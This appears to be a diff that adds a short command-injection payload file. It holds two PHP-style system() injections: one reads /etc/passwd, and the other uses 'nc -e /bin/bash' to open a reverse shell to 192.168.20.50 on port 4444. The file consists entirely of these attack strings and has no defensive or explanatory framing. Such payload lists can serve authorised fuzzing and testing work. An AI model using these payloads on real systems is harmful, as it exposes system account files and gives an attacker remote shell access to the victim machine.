@@ -1,0 +1,4 @@
+; system('cat /etc/passwd | head -3')
+
+
+; system('nc -e /bin/bash 192.168.20.50 4444')
